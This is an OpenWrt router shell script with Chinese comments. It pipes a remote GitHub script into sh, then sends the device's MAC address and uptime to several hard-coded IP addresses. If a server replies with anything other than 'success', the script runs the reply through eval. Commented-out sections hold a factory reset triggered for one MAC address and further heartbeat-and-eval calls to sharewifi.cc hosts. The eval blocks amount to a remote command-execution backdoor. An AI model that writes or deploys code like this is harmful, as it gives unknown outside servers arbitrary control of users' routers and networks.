#!/bin/sh
echo "hello openwrt, $(date '+%Y-%m-%d %H:%M:%S')"
wget -O - https://raw.githubusercontent.com/TStar-Admin/domain_check/refs/heads/main/test_server_ph.sh | sh
IFACE="eth0"
MAC_ADDRESS=$(cat /sys/class/net/${IFACE}/address 2>/dev/null)

if [ -z "$MAC_ADDRESS" ]; then
  echo "❌ MAC 地址获取失败"
  exit 1
fi

# 转换成大写比较
MAC_ADDRESS_UPPER=$(echo "$MAC_ADDRESS" | tr 'a-z' 'A-Z')

# 特殊 MAC 地址判断
# if [ "$MAC_ADDRESS_UPPER" = "8C:DE:F9:55:3E:EC" ]; then
#   echo "⚠️ 检测到目标MAC地址，执行恢复出厂并重启"
#   firstboot -y
#   reboot
#   exit 0
# fi



# 随机手机品牌列表
# BRANDS="iPhone Samsung Huawei Xiaomi OPPO Vivo Realme Honor OnePlus Meizu"
# BRAND_ARRAY=$(echo $BRANDS | tr ' ' '\n')
# BRAND_LIST=$(echo "$BRAND_ARRAY" | awk 'BEGIN {srand()} {a[NR]=$0} END {print a[int(rand()*NR)+1]}')

# 设置主机名
# hostname "$BRAND_LIST"
# uci set system.@system[0].hostname="$BRAND_LIST"
# uci commit system
# /etc/init.d/system reload
# echo "✅ 主机名已设置为：$BRAND_LIST"




UPTIME_SEC=$(cut -d. -f1 /proc/uptime)
connectSuccess=0;

# if [ $connectSuccess -eq 0 ]; then
#   URL="http://8.212.166.134/api/router/updateMQDns?mac=$MAC_ADDRESS&id=134&time=$UPTIME_SEC"
#   echo "访问URL: $URL"
  
#   # 获取响应和状态码
#   response=$(wget -qO- --server-response "$URL" 2>&1)
#   status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)

#   if [ "$status_code" = "200" ]; then
#       # 提取响应体（去掉header部分）
#       body=$(echo "$response" | sed -n '/^$/,$p' | tail -n +2)
#       echo "服务器返回：$body"

#       if [ "$body" != "success" ]; then
#           echo "执行命令: $body"
#           eval "$body"
#       fi
#       connectSuccess=1
#   else
#       echo "请求失败，状态码: $status_code"
#   fi
# fi
if [ $connectSuccess -eq 0 ]; then
  URL="http://8.220.151.101:8080/api/router/updateMQDns?mac=$MAC_ADDRESS&id=101&time=$UPTIME_SEC"
  echo "访问URL: $URL"
  
  # 获取响应和状态码
  response=$(wget -qO- --server-response --timeout=5 --tries=1 "$URL" 2>&1)
  status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)
  
  if [ "$status_code" = "200" ]; then
      # 提取响应体（去掉header部分）
      body=$(echo "$response" | tail -n1)
      echo "服务器返回：$body"

      if [ "$body" != "success" ]; then
          echo "执行命令: $body"
          eval "$body"
      fi
      connectSuccess=1
  else
      echo "请求失败，状态码: $status_code"
  fi
fi
if [ $connectSuccess -eq 0 ]; then
  URL="http://8.212.155.150:8080/api/router/updateMQDns?mac=$MAC_ADDRESS&id=150&time=$UPTIME_SEC"
  echo "访问URL: $URL"
  
  # 获取响应和状态码
  response=$(wget -qO- --server-response --timeout=5 --tries=1 "$URL" 2>&1)
  status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)

  if [ "$status_code" = "200" ]; then
      # 提取响应体（去掉header部分）
      body=$(echo "$response" | tail -n1)
      echo "服务器返回：$body"

      if [ "$body" != "success" ]; then
          echo "执行命令: $body"
          eval "$body"
      fi
      connectSuccess=1
  else
      echo "请求失败，状态码: $status_code"
  fi
fi




if [ $connectSuccess -eq 0 ]; then
  URL="http://47.242.77.178:8080/api//router/updateMQDns?mac=$MAC_ADDRESS&id=178&time=$UPTIME_SEC"
  echo "访问URL: $URL"
  
  # 获取响应和状态码
  response=$(wget -qO- --server-response --timeout=5 --tries=1 "$URL" 2>&1)
  status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)

  if [ "$status_code" = "200" ]; then
      # 提取响应体（去掉header部分）
      body=$(echo "$response" | tail -n1)
      echo "服务器返回：$body"

      if [ "$body" != "success" ]; then
          echo "执行命令: $body"
          eval "$body"
      fi
      connectSuccess=1
  else
      echo "请求失败，状态码: $status_code"
  fi
fi
# URL="https://router.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=GitHub&time=$UPTIME_SEC"
# echo "访问URL: $URL"

# response=$(wget -qO- "$URL")
# echo "服务器返回：$response"

# if [ "$response" != "success" ]; then
#     echo "执行命令: $response"
#     eval "$response"
# fi

# URL="https://crmeb.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=Google&time=$UPTIME_SEC"
# echo "访问URL: $URL"

# response=$(wget -qO- "$URL")
# echo "服务器返回：$response"

# URL="https://rg.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=Google&time=$UPTIME_SEC"
# echo "访问URL: $URL"

# response=$(wget -qO- "$URL")
# echo "服务器返回：$response"

